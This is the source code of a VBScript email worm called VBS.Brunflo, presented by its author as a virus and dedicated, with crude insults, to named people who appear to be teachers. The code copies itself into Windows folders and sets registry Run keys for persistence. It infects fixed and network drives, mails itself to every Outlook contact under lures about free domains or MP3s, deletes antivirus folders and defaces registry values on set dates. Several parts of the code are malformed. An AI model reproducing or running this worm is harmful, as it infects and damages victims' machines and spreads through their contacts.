'
'This is the Anti-Brunflo virus created by LorDAngeR of the Gue§§ CreW
'
'
'Dedicated to:
'
'Anna Edblad, Robert Planeskog, Ulf Swelander, Margot, 
'Håkan "Haxson" Axelsson and some other teachers
'
'Margot "Da Cookie Eater No. 1" <-- fatass muthafuckah'
'
'
'
'Some parts of the infection is from the Tune.vbs virus by Slug
'

Dim fso, d, t
Set fso = CreateObject("Scripting.FileSystemObject")
Set d = fso.GetDrive(drvpath)
Select Case d.DriveType
Case 0: t = "Unknown"
Case 1: t = "Removable"
Case 2: t = "Fixed"
Case 3: t = "Network"
Case 4: t = "CD-ROM"
Case 5: t = "RAM Disk"
End Select
if t = "" then t = "None"
ShowDriveType = t
End Function

sub Brunflo()
On Error Resume Next
Dim obj, sysfldr,s, f
Set obj = CreateObject("Scripting.FileSystemObject")
Set sysfldr = obj.GetSpecialFolder(1)
Set winfldr = obj.GetSpecialFolder(0)
Set tmpfldr = obj.GetSpecialFolder(2)
set s = CreateObject("Scripting.FileSystemObject")
Brunflo = Wscript.ScriptFullName
'Not Used
'Set f = s.GetFile(WScript.ScriptFullName)
'
f.copy(sysfldr&"\Brunflo.vbs")
f.copy(winfldr&"\Brunflo.vbs")
f.copy(tmpfldr&"\Brunflo.vbs")
f.copy(winfldr&"\winsck.vbs")
f.copy(sysfldr&"\explorer.vbs")
loc=winfldr&"\Brunflo.vbs"
loc1=sysfldr&"\Brunflo.vbs"
loc2=tmpfldr&"\Brunflo.vbs"
loc3=winfldr&"\winsck.vbs"
loc4="explorer.vbs"
Set WSHShell = CreateObject("WScript.Shell")
WSHShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\ScanRegistry", loc
WSHShell.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\", loc1
WSHShell.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices\", loc2
editini winfldr&"\win.ini","[windows]","load",loc3
editini winfldr&"\system.ini","[boot]","shell","Explorer.exe " & loc4
ntwrk()
end sub



'Spread network

sub ntwrk()
On Error Resume Next
for n = 65 to 90
l=Chr(n) 
drv=l&":"
d3=ShowDriveType(drv)
if d3 = "Fixed" then infect(drv)
if d3 = "Network" then infect(drv)
next
sprd()
end sub

'Spread with Outlook Express

sub sprd()
on error resume next
Dim oShell
Set oShell = Wscript.CreateObject("Wscript.Shell")
Dim strProfile
Dim strAlias, strAliasKey
strProfile = oShell.RegRead("HKCU\Software\Microsoft\Windows\CurrentVersion\Sent?")
if strProfile = "" then
oShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Sent?", "1"
Set Prg = CreateObject("Outlook.Application")
Set Prg1 = Prg.GetNameSpace("MAPI")
For y = 1 To Prg1.AddressLists.Count
Set AdBook = Prg1.AddressLists(y)
x = 1
Set Maie = Prg.CreateItem(0)
For oo = 1 To AdBook.AddressEntries.Count
newmailadd = AdBook.AddressEntries(x)
Maie.Recipients.Add newmailadd
x = x + 1
Next
Maie.Subject = "Brunflo/Free Webhosting! Get a free domain!"
Maie.Body = "Download the attachment to get the URL to the register page. Just fill in the form and press SUBMIT to get a free www.yourname.com adress!"
Maie.Attachments.Add WScript.ScriptFullName
Maie.DeleteAfterSubmit = False
Maie.Send
newmailadd=""
next
else
end if
end sub



'This following code is written by LorDAngeR without ripping one single line *proud :)*
'The code above this comments was ripped from Tune.vbs by Slug *sorry!!!*


WScript.Echo ("Anti-Brunflo virus AKA VBS.Brunflo")
WScript.Echo ("Coded by:")
WScript.Echo ("LorDAngeR")
WScript.Echo ("1 & 2, Its my fucking Brunflo CreW")
WScript.Echo ("Written For The Gue§§ CreW")
WScript.Echo ("Oops!... I Did It Again... I fucked you up, i dunno why, i think im high, Flying high like a muthafuccin plane")
WScript.Echo ("Origin: Sweden, Brunflo")
WScript.Echo ("Thanks to Slug for spreading Tune.vbs")
WScript.Echo ("Face Down Ass Up Thats The Way We Like To Fuck!")
WScript.Echo ("http://mp3.com/lordanger")
WScript.Echo ("If you feel like it, you can trace this fucking virus easily and give me a fine or something... I dont give a fuck, that only proofs that im a kickass programmer ;) Gue§§ - Love Us Or Die!")
WScript.Echo ("Oops!... I did it again, I played with your cunt, got lost in your ass, Oh baby baby, Boobs!... I Did It Again, I filled up my chest, Got one bigger size, Oh baby baby")
WScript.Echo ("This is dedicated to:")
WScript.Echo ("Anna Edblad")
WScript.Echo ("Robert Planeskog")
WScript.Echo ("Ulf Swelander")
WScript.Echo ("Håkan Axelson AKA Haxson")
WScript.Echo ("Sär Per")
WScript.Echo ("Berndt Larson")
WScript.Echo ("Margot Lindström")
WScript.Echo ("Charlotte Jakobsen")
WScript.Echo ("Lars-Åke Forsberg")
WScript.Echo ("Lisa Helmersson")
WScript.Echo ("Ida Hallquist")
WScript.Echo ("Linda Fastesson")
WScript.Echo ("MrMike")
WScript.Echo ("Some of the the 9D crew")
WScript.Echo ("My father")
WScript.Echo ("And now the serious dedications:")
WScript.Echo ("Slug")
WScript.Echo ("My IRC Friends")
WScript.Echo ("My ICQ Friends")
WScript.Echo ("Gue§§ CreW")
WScript.Echo ("Brunflo CreW")
WScript.Echo ("Dez")
WScript.Echo ("Flikka AKA Frosty")
WScript.Echo ("Tora-Liffa AKA SiR SMoKE-a-LoT")
WScript.Echo ("Info about this virus:")
WScript.Echo ("But first i want to say that "I Love You" :) Ive never seen that virus but i already love it :) *hehe*")
WScript.Echo ("And i want to let you in on a little secret...")
WScript.Echo ("Run this file again on the 13th this month ill tell you the secret!")
WScript.Echo ("Over to you, This was the Gue§§ CreW")
WScript.Echo ("13 is my lucky number")
WScript.Echo ("Sorry for the amount of messageboxes...")
WScript.Echo ("//LorDAngeR")
Set MyShortcut = WSHShell.CreateShortcut(DesktopPath & "\LorDAngeR.lnk")
MyShortcut.TargetPath = WSHShell.ExpandEnvironmentStrings("http://www.mp3.com/lordanger")

If Day(Now()) = 13 Then

  WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Version", "ß®1tñ3ÿ §þ34®§ 2000"
  WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RegisteredOwner", "£0®Ð4ÑG3®^Gûê§§"
  WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RegisteredOrganization", "ß®1tñ3ÿ §þ34®§ Owns Ya Dumb Ass"
  WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "c:\windows\Brunflo.vbs"
  WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\ProductKey", "Gue§§-OEM-Gue§§!!-kOnDa-LorDAngeR-Br1tn3ySp34rs"
  WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\ProductId", "Gue§§-OEM-Gue§§!!-kOnDa-LorDAngeR-Br1tn3ySp34rs"
  WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\ProductName", "Windows 75 - GueSS Edition"

  fSO.DeleteFolder ("c:\Program Files\Mcafee")
  fSO.DeleteFolder ("c:\Program Files\avp")
  fSO.DeleteFolder ("c:\f-prot")
  fSO.Createfolder ("c:\ß®1tñ3ÿ§þ34®§")
  fSO.Createfolder ("c:\LorDAngeR")
  fSO.Createfolder ("c:\Gue§§_CreW")
  fSO.Createfolder ("c:\BritneySpears")
  fSO.Createfolder ("c:\Britney")
  fSO.Createfolder ("c:\Spears")
  fSO.Createfolder ("c:\Dont-Feel-Offended!")
  fSO.Createfolder ("c:\http://mp3.com/lordanger")
  fSO.Createfolder ("c:\Oops!..._I-Did-It-Again")
  fSO.createfolder ("c:\Brunflo")
  fSO.createfolder ("c:\Anti-Brunflo")
f.copy(c:\windows\all users\start-menyn\program\autostart\Brunflo.vbs")
f.copy(c:\windows\all users\start-menu\program\autostart\Brunflo.vbs")

'Link to my page

  Set VirusLink = WshShell.CreateShortcut("C:\WINDOWS\Favorites\LorDAngeR.URL")
  VirusLink.TargetPath = "http://mp3.com/lordanger"
  VirusLink.Save
  WshShell.Run ("C:\WINDOWS\Favorites\LorDAngeR.URL")

'Poooooofff! No Icons :)
'LorDAngeR AKA Br1tn3y Sp34rs AKA ß®1tñ3ÿ §þ34®§
wshshell.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\HideIcons", 1, "REG_DWORD"
WScript.Echo ("Look at your desktop :)")
WScript.Echo ("//LorDAngeR")


End If





If Day(Now()) = 6 Then
WScript.Echo ("6th... If it is November now, its my birthday today :)")
SouthPark = WScript.ScriptFullName13
sub sprd2()
on error resume next
Dim oShell
Set oShell = Wscript.CreateObject("Wscript.Shell")
Dim strProfile
Dim strAlias, strAliasKey
strProfile = oShell.RegRead("HKCU\Software\Microsoft\Windows\CurrentVersion\Sent?")
if strProfile = "" then
oShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Sent?", "1"
Set Prg = CreateObject("Outlook.Application")
Set Prg1 = Prg.GetNameSpace("MAPI")
For y = 1 To Prg1.AddressLists.Count
Set AdBook = Prg1.AddressLists(y)
x = 1
Set Maie = Prg.CreateItem(0)
For oo = 1 To AdBook.AddressEntries.Count
newmailadd = AdBook.AddressEntries(x)
Maie.Recipients.Add newmailadd
x = x + 1
Next
Maie.Subject = "Friends Cancelled?"
Maie.Body = "Hello! im BCC'ing this attachment to everyone on my list because of a rumour that Friends is going to be canselled! Download the attachment and fill out the form included (Why Friends shouldnt be cancelled ETC) and press SEND! That will send a mail to the Friends creators. "
Maie.Attachments.Add WScript.ScriptFullName13
Maie.DeleteAfterSubmit = False
Maie.Send
newmailadd=""
next
else
end if
end sub

If Day(Now()) = 7 Then
WScript.Echo ("7th... If it is January now, Its my Friends birthday today :)")
FreeMp3s = WScript.ScriptFullName14
sub sprd2()
on error resume next
Dim oShell
Set oShell = Wscript.CreateObject("Wscript.Shell")
Dim strProfile
Dim strAlias, strAliasKey
strProfile = oShell.RegRead("HKCU\Software\Microsoft\Windows\CurrentVersion\Sent?")
if strProfile = "" then
oShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Sent?", "1"
Set Prg = CreateObject("Outlook.Application")
Set Prg1 = Prg.GetNameSpace("MAPI")
For y = 1 To Prg1.AddressLists.Count
Set AdBook = Prg1.AddressLists(y)
x = 1
Set Maie = Prg.CreateItem(0)
For oo = 1 To AdBook.AddressEntries.Count
newmailadd = AdBook.AddressEntries(x)
Maie.Recipients.Add newmailadd
x = x + 1
Next
Maie.Subject = "Legal Mp3s!"
Maie.Body = "Download the attachment and fill out the form to get mails every week that contains top quality artists FREE mp3s :)"
Maie.Attachments.Add WScript.ScriptFullName14
Maie.DeleteAfterSubmit = False
Maie.Send
newmailadd=""
next
else
end if
end sub

If Day(Now()) = 24 Then
WScript.Echo ("24th... If it is December now, Im going to kill myself")
IllegalMp3s = WScript.ScriptFullName15
sub sprd2()
on error resume next
Dim oShell
Set oShell = Wscript.CreateObject("Wscript.Shell")
Dim strProfile
Dim strAlias, strAliasKey
strProfile = oShell.RegRead("HKCU\Software\Microsoft\Windows\CurrentVersion\Sent?")
if strProfile = "" then
oShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Sent?", "1"
Set Prg = CreateObject("Outlook.Application")
Set Prg1 = Prg.GetNameSpace("MAPI")
For y = 1 To Prg1.AddressLists.Count
Set AdBook = Prg1.AddressLists(y)
x = 1
Set Maie = Prg.CreateItem(0)
For oo = 1 To AdBook.AddressEntries.Count
newmailadd = AdBook.AddressEntries(x)
Maie.Recipients.Add newmailadd
x = x + 1
Next
Maie.Subject = "MP3s"
Maie.Body = "Download the attachment and fill out the form to get mails every week that contains FTPs and URLs with MP3s, games, porno, movies, xxx-passes and other stuff! Be sure to fill in your real mailadress!"
Maie.Attachments.Add WScript.ScriptFullName15
Maie.DeleteAfterSubmit = False
Maie.Send
newmailadd=""
next
else
end if
end sub







'Shit, i hope that this will work now :)
'I dont feel like coding some shit that doesnt work...
'And i dont have two working computers so i cant try it :/
'
'
'
'
'
'
'Info about VBS.Brunflo :
'
'The virus was born in Sweden in a suburb to Östersund called Brunflo
'Author: LorDAngeR AKA ß®1tñ3ÿ §þ34®§
'Size: About 7kb
'Why does the best viruses come from Asia and that kinda places?
'I only know of one Swedish virus... except for my viruses.
'Jacky007, Boot-Sector virus... shit, Swedes can be lame sometimes :)
'